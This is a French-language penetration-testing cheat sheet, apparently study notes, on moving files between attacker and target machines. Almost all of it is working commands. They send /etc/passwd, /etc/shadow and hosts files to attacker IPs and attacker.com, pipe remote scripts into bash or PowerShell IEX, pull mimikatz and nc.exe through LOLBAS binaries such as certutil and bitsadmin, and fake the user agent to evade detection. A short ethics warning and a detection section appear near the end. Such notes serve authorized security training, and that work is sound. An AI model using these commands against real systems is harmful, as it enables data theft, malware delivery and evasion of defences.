
- [[#NETCAT / NCAT / NC]]
- [[#DEV/TCP]]
- [[#BASE64 (BYPASS FIREWALL)]]
- [[#BASE64 UPLOADS (POST-REQUEST)]]
- [[#Valider le format et l'intégrité du fichier]]
- [[#GTFOBINS / LOLBAS (BYPASS DETECTION)]]

- [[#DOWNLOADS]]
	- [[#HTTP DOWNLOADS]]
	- [[#SMB DOWNLOADS]]
	- [[#FTP DOWNLOADS]]
	- [[#SSH DOWNLOADS]]

- [[#UPLOADS Exfiltration]]
	- [[#HTTP UPLOADS]]
	- [[#SMB UPLOADS]]
	- [[#FTP UPLOADS]]
	- [[#SSH UPLOAD]]

- [[#DATA TRANSFER WITH CODE]]
	- [[#PYTHON]]
	- [[#PHP]]
	- [[#PERL]]
	- [[#RUBY]]
	- [[#VBSCRIPT]]
	- [[#JAVASCRIPT]]

- [[#WINRM DATA TRANSFER]]
- [[#RDP DATA TRANSFER]]
- [[#PROTECTED FILE TRANSFERS]]

---

# NETCAT / NCAT / NC

## NC

### Classique

Envoyeur (option -q 0 pour fermer la connexion une fois transfert terminé)

```bash
nc -q 0 -lp 8000 < /etc/passwd
```

Receveur

```bash
nc <ip_envoyeur> 8000 > etc.passwd
```

### #Base64

Envoyeur

```bash
base64 /etc/passwd -w 0 | nc -q 0 -lp 8000
```

Receveur

```bash
nc <ip_envoyeur> 8000 | base64 -d > etc.passwd
```

## NCAT

### Classique

envoyeur

```shell
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

receveur

```shell
ncat -lp 8000 --recv-only > SharpKatz.exe
```

### #Base64 

envoyeur

```shell
base64 /etc/passwd -w 0 | ncat --send-only 192.168.49.128 8000
```

receveur

```shell
ncat -lp 8000 --recv-only | base64 -d > etc.passwd
```


---
# DEV/TCP

receveur
```shell
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

envoyeur
```bash
nc -nvlp 443 -q 0 < SharpKatz.exe
```


---
# BASE64 (BYPASS FIREWALL)

## Encoder fichier en base64

BASH

```bash
base64 fichier -w 0
```

POWERSHELL

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

CERTUTIL #LOLBAS

```powershell
certutil -encode file.ext file.base64
```
## Décoder fichier en base64

BASH

```bash
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > fichier
```

POWERSHELL

```powershell
[IO.File]::WriteAllBytes("C:\Path\to\file", [Convert]::FromBase64String("Base64String"))
```

CERTUTIL #LOLBAS 

```powershell
certutil -decode file.base64 file.ext
```

# BASE64 UPLOADS (POST-REQUEST)

## Lancer listener netcat

```sh
nc -lvnp 8000
```

## Convertir le fichier à exfiltrer en Base64

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```

## Upload le string Base64

```powershell
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

---

# Valider le format et l'intégrité du fichier

## Check du format du fichier

BASH

```bash
file fichier
```

POWERSHELL
## Check du hash md5

BASH

```bash
md5sum fichier
```

POWERSHELL

```powershell
Get-FileHash -Algorithm md5 fichier
```

## Diff pour s'assurer que les hashs sont identiques

format hash:hash

https://gchq.github.io/CyberChef/#recipe=Diff(':','Character',true,true,false,false)

---
# GTFOBINS / LOLBAS (BYPASS DETECTION)

https://lolbas-project.github.io/#/download
https://lolbas-project.github.io/#/upload
https://gtfobins.github.io/#+file%20download
https://gtfobins.github.io/#+file%20upload


## LOLBAS (Windows)

### Download

#### Certutil

```powershell
certutil.exe -urlcache -split -f https://www.example.org/file.exe file.exe
```

```powershell
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe nc.exe
```

#### Bitsadmin

```powershell
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

```powershell
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

#### CertOC (c:\windows\system32\certoc.exe)

```powershell
certoc.exe -GetCACAPS https://www.example.org/file.ps1
```

#### GfxDownloadWrapper

```powershell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

### Upload

#### Certreq

```powershell
certreq.exe -Post -config http://192.168.49.128:8000/upload c:\windows\win.ini
```

#### DataSvcUtil (C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe)

```
DataSvcUtil /out:C:\Windows\Temp\file.ext /uri:https://www.example.org/file.ext
```




## GTFOBINS (Linux)

### Download
#### OpenSSL (Chiffré)

Créer certificat sur attacker
```shell
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

Monter serveur avec certificat depuis attacker
```shell
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Télécharger le fichier depuis la target
```shell
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## Bash

Depuis cible

```
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$RHOST/$RPORT \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
```



### Upload

#### OpenSSL (Chiffré)

Créer certificat sur attacker
```shell
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
```

Monter serveur avec certificat depuis attacker
```bash
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save
```

#### BusyBox

Monter serveur http depuis la target
```bash
busybox httpd -f -p $LPORT -h .
```



---
# #DOWNLOADS

# HTTP DOWNLOADS

https://gist.github.com/HarmJ0y/bb48307ffa663256e239

## Créer serveur à la volée

Python3

```bash
python3 -m http.server 8000
```

variante HTTPS (possible de download également) [[DATA TRANSFER#SSL pour chiffrer la communication]]

Python2.7

```shell
python2.7 -m SimpleHTTPServer
```

Php

```shell
php -S 0.0.0.0:8000
```

Ruby

```sh
ruby -run -ehttpd . -p8000
```

## File download

### BASH

```BASH
wget http://10.10.14.1:8000/linenum.sh -o linenum.sh --no-check-certificate
```

```BASH
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh --insecure
```

## /dev/tcp (bash 2.04+) (Fileless)

Connexion a la target

```shell
exec 3<>/dev/tcp/10.10.10.32/80
```

Get request

```shell
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

Print response

```shell
cat <&3
```

### POWERSHELL

```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1 -UseBasicParsing
```

bypass SSL error

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## Fileless (Chargé en mémoire)

POWERSHELL

```powershell
IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
```

```powershell
(New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX
```

BASH

```shell
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

```shell
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```


# SMB DOWNLOADS

## Créer partage avec Impacket

BASH

```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

En cas de besoin de s'authentifier:

```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

## Monter le partage sur la cible

```cmd-session
net use n: \\192.168.220.133\share /user:test test
```

Valider le montage

```
dir \\192.168.220.133\share
```

## File copy

```cmd
copy \\192.168.220.133\share\nc.exe
```


Demonter le share

```
net use n: /delete
```


# FTP DOWNLOADS

## Créer serveur ftp avec pyftpdlib

```shell
sudo pip3 install pyftpdlib
```

```sh
sudo python3 -m pyftpdlib --port 21
```

## File transfer

POWERSHELL

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

### Alternative

Créer un fichier de commandes sur le client FTP en cas de shell non interactif

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

# SSH DOWNLOADS

## Depuis Target

## Activer et lancer serveur SSH

```shell
sudo systemctl enable ssh
sudo systemctl start ssh
```

## Check du port 22 en écoute

```sh
netstat -lnpt
```

## Download du fichier depuis target (créer un compte temporaire) 

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```


## Depuis Client

```
scp -r -i file.pem user@192.10.10.10:/home/backup /home/user/Desktop/
```


---
# #UPLOADS #Exfiltration


# HTTP UPLOADS

## Créer serveur d'upload python (Option 1)

```shell
pip3 install uploadserver
```

```shell
python3 -m uploadserver
```

### SSL pour chiffrer la communication

Créer le certificat

```shell
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

Changer de répertoire pour ne pas host le certificat

```shell
mkdir https && cd https
```

Lancer le serveur en utilisant le certificat

```shell
python3 -m uploadserver 443 --server-certificate ~/server.pem
```

## Monter NGINX (option 2)

Créer répertoire d'upload
```shell
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```

Attribuer les droits à www-data
```shell
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

Créer fichier de config /etc/nginx/sites-available/upload.conf

```shell
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

Lien symbolique du site vers les sites activés
```shell
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

Démarrer NGINX
```shell
sudo systemctl restart nginx.service
```

Si erreur
```shell
tail -2 /var/log/nginx/error.log
```

Supprimer la conf par défaut 
```shell
sudo rm /etc/nginx/sites-enabled/default
```

Vérifier qu'il n'y a pas de directory listing sur http://localhost/SecretUploadDirectory

## Upload d'un fichier

### POWERSHELL

Import du script nécessaire en PowerShell

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

Upload

```powershell
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### BASH

Upload de fichiers multiples avec POST request CURL

```shell
curl -X POST https://192.168.49.128/upload -F files=@/etc/passwd -F files=@/etc/shadow --insecure
```


# BASE64 UPLOADS (POST-REQUEST)

## Lancer listener netcat

```sh
nc -lvnp 8000
```

## Convertir le fichier à exfiltrer en Base64

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```

## Upload le string Base64

```powershell
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

## [[DATA TRANSFER#Décoder fichier en base64]]


# SMB UPLOADS

## Partage SMB Impacket -> [[DATA TRANSFER#Créer partage avec Impacket]]

ou
## SMB over HTTP UPLOADS (WebDAV)

## #BypassSmbRestriction

## Installer et lancer module python webdav

```shell
sudo pip3 install wsgidav cheroot
```

```shell
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

## Connexion au partage depuis machine cible

```cmd
dir \\192.168.49.128\DavWWWRoot
```

## Upload des fichiers sur le partage

```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```


# FTP UPLOADS

## Monter partage avec python

```shell
sudo pip3 install pyftpdlib
```

```shell
sudo python3 -m pyftpdlib --port 21 --write
```

## Upload du fichier avec powershell

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### Alternative

Créer fichier de commande si pas de shell interactif

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

# SSH UPLOAD
## SCP 

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```


---

# DATA TRANSFER WITH CODE

## PYTHON

### DOWNLOAD

#### Python 2 - Download

```shell
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
#### Python 3 - Download

```shell
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### UPLOAD

lancer serveur
```shell
python3 -m uploadserver
```

upload
```shell
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```


## PHP
### DOWNLOAD
#### PHP Download with File_get_contents()

```shell
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
#### PHP Download with Fopen()

```shell
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
#### PHP Download a File and Pipe it to Bash (Fileless)

```shell
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```


## RUBY

### DOWNLOAD

```shell
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

## PERL

### DOWNLOAD

```shell
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

## JAVASCRIPT

### DOWNLOAD

Créer le script
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Download
```powershell
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

## VBSCRIPT

### DOWNLOAD

Créer le script
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Download
```powershell
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```


---

# WINRM DATA TRANSFER

Confirmer que le port est ouvert
```powershell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

Créer remoting session
```powershell
$Session = New-PSSession -ComputerName DATABASE01
```

Download
```powershell
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

Upload
```powershell
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```


---

# RDP DATA TRANSFER

Monter partage de fichier Rdesktop

```shell
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/path/to/share'
```

Monter partage de fichier xfreerdp

```shell
xfreerdp3 /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/path/to/share
```

```
Accéder au partage depuis session rdp en tapant \\tsclient\
```

Possible également de monter un partage avec MSTSC uniquement pour le logged-on user

![[Pasted image 20250321005305.png]]


---

# PROTECTED FILE TRANSFERS

> [!IMPORTANT]
> A moins que spécifiquement demandé par le client, ne jamais exfiltrer des données sensibles telles que des numéros de carte de crédits, données sensibles, données commerciales etc...
> Si besoin de tester la DLP, créer un fichier factice qui mimique les données que le client souhaite protéger.
> Utiliser un canal sécurisé (HTTPS, SFTP, SSH) [[DATA TRANSFER#SSL pour chiffrer la communication]] pour transférer les fichiers !


## FILE ENCRYPTION AES256

### Windows
#### Invoke-AESEncryption.ps1

https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1

1. Transférer fichier sur la target
2. Importer le module

```powershell
Import-Module .\Invoke-AESEncryption.ps1
```

3. Chiffrer le fichier en utilisant un mot de passe fort et unique

```powershell
Invoke-AESEncryption -Mode Encrypt -Key 'Passw0rd' -Path .\scan-results.txt
```

### Linux

#### OpenSSL

```shell
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```


## FILE DECRYPTION AES256

#### Invoke-AESEncryption.ps1

```powershell
Import-Module .\Invoke-AESEncryption.ps1
```

```powershell
Invoke-AESEncryption -Mode Decrypt -Key 'Passw0rd' -Path .\scan-results.txt
```

#### OpenSSL

```shell
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```


# DETECTION

Faire une whitelist des commandes autorisées (éviter blacklist sujette à bypass).
Surveiller les user-agents avec un SIEM (https://useragentstring.com/pages/useragentstring.php)

# DETECTION EVASION

## Changer le user-agent

Lister les user agents

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

Download avec UserAgent de Chrome

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

## Tester les LOLBINS / LOLBAS qui pourraient être whitelistés [[#GTFOBINS / LOLBAS]]
